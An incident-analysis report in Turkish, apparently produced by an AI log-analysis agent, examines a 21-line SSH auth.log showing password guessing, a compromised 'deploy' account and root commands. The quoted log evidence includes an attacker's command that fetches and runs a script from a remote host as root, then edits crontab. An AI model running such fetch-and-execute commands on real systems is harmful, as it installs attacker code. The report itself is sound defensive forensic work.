# SSH Kimlik Doğrulama Logu Analizi — web01 (uçtan uca deneme)

**Tarih:** 2026-10-25 · **Skill:** log-analysis · **Hazırlayan:** agent (log-analyst)

## Kapsam
- Girdi: `samples/auth.log` — 21 satır, tek host (`web01`), SHA-256 `9548823758935a9ca0db1b3375da01795d3a69876eaaaba7c78715cd534ad73f`. Dosya salt-okunur kullanıldı, değiştirilmedi.
- Yöntem: Dosya satır numaralarıyla okundu (`cat -n`). Tüm sayılar `grep -c`, `grep | sort | uniq -c`, `awk` ve `wc -l` ile sayıldı. Komutlar ve çıktıları Kanıt bölümünde.
- Zaman notu: Log satırlarında yıl ve saat dilimi yok (`grep -cE '\b20[0-9]{2}\b'` → 0). Tarihler logdaki gibi "Oct 24" olarak aktarıldı. Saatler, saat dilimi bilinmeyen sunucu saatidir.
- Kapsam dışı: IP'lere yönelik ağ eylemi (ping, tarama, bağlantı, itibar/tehdit istihbaratı sorgusu) yapılmadı. `x.sh` ve crontab içeriği, sudoers, `samples/sshd_config` (ayrı alt görev: config-auditor), diğer loglar (rotasyonlu auth.log, cron/syslog, wtmp/lastlog, ağ/proxy logları) ve `reports/` altındaki eski raporlar incelenmedi.

## Bulgular
- [OLGU] O1 — Tek kaynaktan çok sayıda başarısız deneme: 203.0.113.45 adresinden 32 saniyede (02:11:05, satır 2 → 02:11:37, satır 11), 5 farklı kullanıcı adına (admin, test, root, oracle, deploy) 8 başarısız parola denemesi var. Bu, logdaki toplam 9 "Failed password" kaydının 8'idir; kalan 1 kayıt 192.0.2.10'dan gelir. 8 başarısız deneme 8 ayrı SSH bağlantısında yapıldı: 8 sshd PID'i (2101, 2103, 2105, 2107, 2109, 2111, 2113, 2115) ve 8 kaynak port (51122–51183). Bu IP'nin kabul edilen bağlantısıyla (PID 2117, port 51190, satır 12) birlikte toplam 9 bağlantı var. Satır 1–11.
- [OLGU] O2 — Geçersiz kullanıcı adları: 3 "Invalid user" kaydı var, üçü de 203.0.113.45'ten: `admin` (satır 1), `test` (satır 3), `oracle` (satır 8). Her birinin ardından "Failed password for invalid user" kaydı geliyor (satır 2, 4, 9).
- [OLGU] O3 — root için başarısız denemeler: root için 3 başarısız parola denemesi var (satır 5, 6, 7). root için başarılı giriş kaydı yok (0).
- [OLGU] O4 — Başarısız → başarılı giriş: `deploy` hesabına 2 başarısız denemenin (satır 10, 11) ardından aynı IP'den (203.0.113.45) 02:11:41'de parola ile giriş kabul edildi (satır 12) ve oturum açıldı (satır 13, aynı PID 2117). Bu IP'nin ilk kaydından (satır 1) kabule kadar 38 saniye geçti. Logdaki tek `deploy` girişi budur ("Accepted … for deploy" = 1). `deploy` için oturum kapanış kaydı yok (0).
- [OLGU] O5 — Yetki yükseltme ve komut çalıştırma: Girişten 77 saniye sonra `deploy` kullanıcısı `sudo` ile `USER=root` olarak 22 saniye içinde 3 komut çalıştırdı (satır 14–16): 198.51.100.7 adresinden `x.sh` indirme (`/usr/bin/wget`), `/bin/bash x.sh` ile çalıştırma ve `/usr/bin/crontab -e`. Üç sudo kaydı da `TTY=pts/1` ve `PWD=/home/deploy` gösteriyor. Logda sudo hata/red kaydı yok ("incorrect password", "authentication failure", "NOT in sudoers" = 0).
- [OLGU] O6 — Gece saati etkinliği: 21 satırın 16'sı 00:00–05:59 aralığında (satır 1–16, 02:11:03–02:13:20). Bu aralıktaki satırların tamamı 203.0.113.45'in deneme/giriş zinciri (sshd PID 2117 oturumu dahil) ve `deploy` sudo komutlarıdır; bu aralıkta başka olay 0. alice'in etkinliği 09:02–14:22 arasında.
- [OLGU] O7 — alice girişleri: alice, 192.0.2.10'dan 09:02:14'te publickey (ED25519) ile giriş yaptı (satır 17–18), oturum 09:40:51'de kapandı (satır 19). 14:22:07'de aynı IP'den 1 başarısız parola denemesi var (satır 20). 5 saniye sonra parola ile giriş kabul edildi (satır 21). Bu ikinci giriş için "session opened" satırı yok: alice için "Accepted" = 2, "session opened" = 1. Log satır 21'de bitiyor.
- [OLGU] O8 — Kayıt anında parola ile giriş açıktı: 2 "Accepted password" kaydı var (satır 12, 21). Sunucu, bu kayıtların yazıldığı anda parola ile kimlik doğrulamayı kabul ediyordu. Bugünkü yapılandırma bu logdan çıkarılamaz.
- [DOĞRULANMAMIŞ] D1 — O1–O5'teki zincir bir sistem ihlaline işaret ediyor olabilir: parola denemeleri, `deploy` hesabının ele geçirilmesi, root yetkisiyle uzaktan betik indirip çalıştırma ve crontab ile kalıcılık. Log, deploy oturumunu `pts/1` ile doğrudan bağlamıyor ve komutların başarıyla tamamlandığını göstermiyor. `x.sh` ve crontab içeriği de görülmedi. Bu yorum host incelemesiyle doğrulanmalı.
- [DOĞRULANMAMIŞ] D2 — O1'deki davranış (kısa sürede çok sayıda yaygın kullanıcı adına başarısız parola denemesi) bir brute-force/sözlük saldırısına benziyor. 203.0.113.45 ve 198.51.100.7'nin kötü niyetli olduğu yalnızca logdaki davranışa dayanan bir değerlendirmedir. Hiçbir itibar veya tehdit istihbaratı kaynağı sorgulanmadı (ağ eylemi kapsam dışı).
- [DOĞRULANMAMIŞ] D3 — Logdaki üç adres (192.0.2.10, 198.51.100.7, 203.0.113.45) RFC 5737'nin dokümantasyon için ayırdığı aralıklara (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) düşüyor gibi görünüyor. Bu durumda dosya sentetik bir örnek olabilir. Kaynak bu oturumda açılıp doğrulanmadı.
- [DOĞRULANMAMIŞ] D4 — alice'in 14:22'deki başarısız→başarılı girişi büyük olasılıkla bir yazım hatasıdır: tek deneme var, 5 saniye sürüyor ve daha önce kullandığı IP'den geliyor. Yine de aynı gün publickey yerine parolanın kullanılması dikkat çekici. Kullanıcıyla teyit edilmedi.
- [DOĞRULANMAMIŞ] D5 — 02:11 civarının bu sunucu için "olağandışı" olup olmadığı bilinmiyor. Kullanıcıların normal çalışma saatlerine ait bir temel çizgi (baseline) ve saat dilimi bilgisi yok.
- [ÖNERİ] Ö1 — O4 (başarısız denemelerden sonra kabul edilen deploy girişi) ve O5'i (ardından root olarak çalıştırılan komutlar) en yüksek öncelikle ele alın. web01'i olası ihlal kabul edip olay müdahale sürecini başlatın. Sistemde değişiklik yapmadan önce, yetkili kişinin onayıyla kanıt toplayın ve hash'lerini alın: bellek, disk, `/home/deploy/x.sh`, root crontab.
- [ÖNERİ] Ö2 — `deploy` hesabını kilitleyin, parolasını değiştirin ve açık oturumlarını sonlandırın. Hesabın `authorized_keys` dosyasını ve sudo yetkisini (sudoers) gözden geçirip en az yetki ilkesini uygulayın.
- [ÖNERİ] Ö3 — root crontab'ını ve `/etc/cron*` dizinlerini 02:13 sonrasındaki değişiklikler için inceleyin. `x.sh`'nin oluşturmuş olabileceği süreçleri, dosyaları, kullanıcıları ve SSH anahtarlarını arayın.
- [ÖNERİ] Ö4 — Ek log toplayın: rotasyonlu auth.log dosyaları, cron/syslog, `wtmp`/`lastlog`, auditd ve ağ/proxy/firewall logları. Bu loglarda 198.51.100.7'ye giden trafiği ve 203.0.113.45'in başka oturumlarını arayın.
- [ÖNERİ] Ö5 — SSH'yi sertleştirin: yalnızca anahtarla giriş (`PasswordAuthentication no`), root girişinin kapatılması (`PermitRootLogin no`), düşük `MaxAuthTries` ve fail2ban benzeri bir hız sınırlama. Bu ayarların mevcut durumu config-auditor alt göreviyle (`samples/sshd_config`) karşılaştırılmalı.
- [ÖNERİ] Ö6 — 203.0.113.45 (gelen) ve 198.51.100.7 (giden) adreslerinin engellenmesini değerlendirin. Karar ve uygulama kullanıcıya veya ağ ekibine aittir; bu analizde ağ eylemi yapılmadı.
- [ÖNERİ] Ö7 — alice ile 14:22'deki parola ile girişi teyit edin.

## Kanıt
Log satırları (`cat -n samples/auth.log`; tamamı alıntıdır):
- `samples/auth.log:1` — `Oct 24 02:11:03 web01 sshd[2101]: Invalid user admin from 203.0.113.45 port 51122` (O1, O2, O4, O6)
- `samples/auth.log:2` — `Oct 24 02:11:05 web01 sshd[2101]: Failed password for invalid user admin from 203.0.113.45 port 51122 ssh2` (O1, O2, O6)
- `samples/auth.log:3` — `Oct 24 02:11:09 web01 sshd[2103]: Invalid user test from 203.0.113.45 port 51130` (O2, O6)
- `samples/auth.log:4` — `Oct 24 02:11:11 web01 sshd[2103]: Failed password for invalid user test from 203.0.113.45 port 51130 ssh2` (O1, O2, O6)
- `samples/auth.log:5` — `Oct 24 02:11:15 web01 sshd[2105]: Failed password for root from 203.0.113.45 port 51141 ssh2` (O1, O3, O6)
- `samples/auth.log:6` — `Oct 24 02:11:19 web01 sshd[2107]: Failed password for root from 203.0.113.45 port 51150 ssh2` (O1, O3, O6)
- `samples/auth.log:7` — `Oct 24 02:11:23 web01 sshd[2109]: Failed password for root from 203.0.113.45 port 51158 ssh2` (O1, O3, O6)
- `samples/auth.log:8` — `Oct 24 02:11:27 web01 sshd[2111]: Invalid user oracle from 203.0.113.45 port 51166` (O2, O6)
- `samples/auth.log:9` — `Oct 24 02:11:29 web01 sshd[2111]: Failed password for invalid user oracle from 203.0.113.45 port 51166 ssh2` (O1, O2, O6)
- `samples/auth.log:10` — `Oct 24 02:11:33 web01 sshd[2113]: Failed password for deploy from 203.0.113.45 port 51175 ssh2` (O1, O4, O6)
- `samples/auth.log:11` — `Oct 24 02:11:37 web01 sshd[2115]: Failed password for deploy from 203.0.113.45 port 51183 ssh2` (O1, O4, O6)
- `samples/auth.log:12` — `Oct 24 02:11:41 web01 sshd[2117]: Accepted password for deploy from 203.0.113.45 port 51190 ssh2` (O1, O4, O5, O6, O8)
- `samples/auth.log:13` — `Oct 24 02:11:41 web01 sshd[2117]: pam_unix(sshd:session): session opened for user deploy by (uid=0)` (O4, O6)
- `samples/auth.log:14` — `Oct 24 02:12:58 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.7/x.sh` (O5, O6)
- `samples/auth.log:15` — `Oct 24 02:13:04 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash x.sh` (O5, O6)
- `samples/auth.log:16` — `Oct 24 02:13:20 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -e` (O5, O6)
- `samples/auth.log:17` — `Oct 24 09:02:14 web01 sshd[3301]: Accepted publickey for alice from 192.0.2.10 port 60211 ssh2: ED25519 SHA256:abc123` (O7)
- `samples/auth.log:18` — `Oct 24 09:02:14 web01 sshd[3301]: pam_unix(sshd:session): session opened for user alice by (uid=0)` (O7)
- `samples/auth.log:19` — `Oct 24 09:40:51 web01 sshd[3301]: pam_unix(sshd:session): session closed for user alice` (O7)
- `samples/auth.log:20` — `Oct 24 14:22:07 web01 sshd[4410]: Failed password for alice from 192.0.2.10 port 60390 ssh2` (O7)
- `samples/auth.log:21` — `Oct 24 14:22:12 web01 sshd[4412]: Accepted password for alice from 192.0.2.10 port 60395 ssh2` (O7, O8)

Sayım komutları ve çıktıları (Git Bash, proje kökünde, `L=samples/auth.log`):
```
wc -l < $L                                        → 21
grep -c 'Failed password' $L                      → 9
grep -c 'Failed password for invalid user' $L     → 3
grep -c 'Invalid user' $L                         → 3
grep -c 'Accepted' $L                             → 3
grep -c 'Accepted password' $L                    → 2
grep -c 'Accepted publickey' $L                   → 1
grep -c ' sudo: ' $L                              → 3
grep -c 'sudo:.*USER=root' $L                     → 3
grep -c 'TTY=pts/1' $L                            → 3
grep -cE 'incorrect password|authentication failure|NOT in sudoers' $L → 0
grep -c 'session opened' $L                       → 2
grep -c 'session closed' $L                       → 1
grep -c 'session closed for user deploy' $L       → 0
grep -c 'Accepted .* for deploy' $L               → 1
grep -c 'Accepted .* for root' $L                 → 0
grep -c 'Accepted .* for alice' $L                → 2
grep -c 'session opened for user alice' $L        → 1
grep -cE '\b20[0-9]{2}\b' $L                      → 0   (yıl bilgisi yok)

grep 'Failed password' $L | grep -oE 'from [0-9.]+' | sort | uniq -c
      1 from 192.0.2.10
      8 from 203.0.113.45

grep 'Failed password' $L | grep '203.0.113.45' | sed -E 's/.*Failed password for (invalid user )?([^ ]+) from.*/\2/' | sort | uniq -c
      1 admin
      2 deploy
      1 oracle
      3 root
      1 test

grep -n 'Invalid user' $L | sed -E 's/.*Invalid user ([^ ]+) from ([0-9.]+).*/\1 \2/' | sort | uniq -c
      1 admin 203.0.113.45
      1 oracle 203.0.113.45
      1 test 203.0.113.45

grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' $L | sort | uniq -c
      3 192.0.2.10
      1 198.51.100.7
     12 203.0.113.45

Bağlantı sayımı — yalnızca başarısız denemeler (203.0.113.45):
awk '/Failed password/ && /203\.0\.113\.45/' $L | grep -oE 'sshd\[[0-9]+\]' | sort -u | wc -l  → 8
  PID'ler: 2101 2103 2105 2107 2109 2111 2113 2115
awk '/Failed password/ && /203\.0\.113\.45/' $L | grep -oE 'port [0-9]+' | sort -u | wc -l     → 8
  portlar: 51122 51130 51141 51150 51158 51166 51175 51183
awk '/Failed password/ && /203\.0\.113\.45/' $L | sed -E 's/.*Failed password for (invalid user )?([^ ]+) from.*/\2/' | sort -u | wc -l → 5
Kabul edilen bağlantı (203.0.113.45):
awk '/Accepted/ && /203\.0\.113\.45/' $L | grep -oE 'sshd\[[0-9]+\]|port [0-9]+'                → sshd[2117] port 51190
Bu IP'nin tüm satırları (başarısız + kabul):
grep '203.0.113.45' $L | grep -oE 'sshd\[[0-9]+\]' | sort -u | wc -l   → 9   (8 başarısız + 1 kabul)
grep '203.0.113.45' $L | grep -oE 'port [0-9]+' | sort -u | wc -l     → 9   (8 başarısız + 1 kabul)
awk 'NR<12 && /Failed password/ && /203\.0\.113\.45/' $L | wc -l      → 8   (kabulden önceki başarısız deneme)
awk '{print $4}' $L | sort | uniq -c                                  → 21 web01

awk '{split($3,t,":"); if (t[1]+0<6) c++} END{print c}' $L            → 16
awk '{split($3,t,":"); if (t[1]+0<6) printf NR" "}' $L                → 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16
awk '{split($3,t,":"); if (t[1]+0<6) print}' $L | grep -vE '203\.0\.113\.45|sshd\[2117\]| sudo: ' | wc -l → 0

Süre hesapları (saniye = sa*3600 + dk*60 + sn farkı):
  satır 1 (02:11:03) → satır 12 (02:11:41)   = 38
  satır 2 (02:11:05) → satır 11 (02:11:37)   = 32
  satır 12 (02:11:41) → satır 14 (02:12:58)  = 77
  satır 14 (02:12:58) → satır 16 (02:13:20)  = 22
  satır 20 (14:22:07) → satır 21 (14:22:12)  = 5

sha256sum $L → 9548823758935a9ca0db1b3375da01795d3a69876eaaaba7c78715cd534ad73f (analiz öncesi ve sonrası aynı)
```

## Doğrulama Durumu
KABUL — O1–O8'deki her olgu, Kanıt bölümündeki satır numaralı log alıntılarıyla eşleşiyor. Tüm sayılar ve süreler komutla üretildi (grep/awk), tahmini sayı yok. Reviewer'ın 1. tur düzeltmelerinden sonra bağlantı sayısı yalnızca başarısız denemeler süzülerek yeniden sayıldı: 8 bağlantı, kabul edilenle birlikte 9. Olgu maddelerinde niyet veya önem nitelemesi yok: "brute-force/sözlük saldırısı" nitelemesi D2'ye, önem/öncelik yorumu Ö1'e taşındı. Yorum gerektiren konular [DOĞRULANMAMIŞ] olarak ayrıldı ve bu karara dahil değil: ihlal sonucu (D1), saldırı niteliği ve IP'lerin niyeti (D2), adres aralıklarının niteliği (D3), alice'in girişi (D4) ve saatlerin olağandışılığı (D5). Özellikle D1, host düzeyinde kanıt (`x.sh`, crontab, süreçler) olmadan doğrulanamaz.
